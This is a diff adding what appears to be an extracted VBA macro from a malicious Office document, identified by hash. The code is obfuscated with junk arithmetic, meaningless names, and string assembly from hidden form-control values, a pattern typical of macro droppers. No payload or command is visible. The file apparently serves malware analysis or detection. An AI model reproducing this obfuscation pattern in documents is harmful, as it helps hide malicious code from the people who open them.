@@ -1,0 +1,45 @@
+Filename     : ./macros/5e7a1ed5f9a1fbc9d7148fbc28a379dc0067508844b6d342084d26b75c995d4f
+OLE stream   : Macros/VBA/Flawacid
+VBA filename : Flawacid.bas
+----------------------------------------
+Attribute VB_Name = "Flawacid"
+Function sublessee(mrjrb827, fooldelta)
+sublessee = ationdri(Int((mrjrb827 * churedro()) + fooldelta))
+End Function
+
+Function ationdri(anyzrata)
+suzuki100 = 17 + 43
+suzuki100 = suzuki100 - 87 - 33 + suzuki10
+suzuki100 = 57 * 56 + suzuki100 + suzuki10
+suzuki100 = 49 * 83 - 77
+suzuki100 = 64 - 20 - 63 + suzuki100 + 2
+suzuki100 = 12 * 28
+ationdri = CInt(anyzrata)
+End Function
+
+Function lawstorm(chenabcd, ajaxdude)
+suzuki100 = 17 + 43
+suzuki100 = suzuki100 - 87 - 33 + suzuki10
+suzuki100 = 57 * 56 + suzuki100 + suzuki10
+suzuki100 = 49 * 83 - 77
+suzuki100 = 64 - 20 - 63 + suzuki100 + 2
+suzuki100 = 12 * 28
+lawstorm = guest1974(gogoose1.cancerfrog) + chenabcd + guest1974(tiggerisp.kinsscri) + _
+ ajaxdude + guest1974(gogoose1.gogueacr + gogoose1.signtist) + ajaxdude
+End Function
+
+Function anesabya(attilapat)
+suzuki100 = 17 + 43
+suzuki100 = suzuki100 - 87 - 33 + suzuki10
+suzuki100 = 57 * 56 + suzuki100 + suzuki10
+suzuki100 = 49 * 83 - 77
+suzuki100 = 64 - 20 - 63 + suzuki100 + 2
+suzuki100 = 12 * 28
+anesabya = guest1974(portroas + xytroftu.BBCFKUJC) + attilapat + _
+guest1974(xytroftu.AVOKNELOBE) + attilapat + guest1974(pedanaeb.moczeegi)
+End Function
+
+Function ninvaude()
+ninvaude = pedanaeb.ruxcontrol
+End Function
+
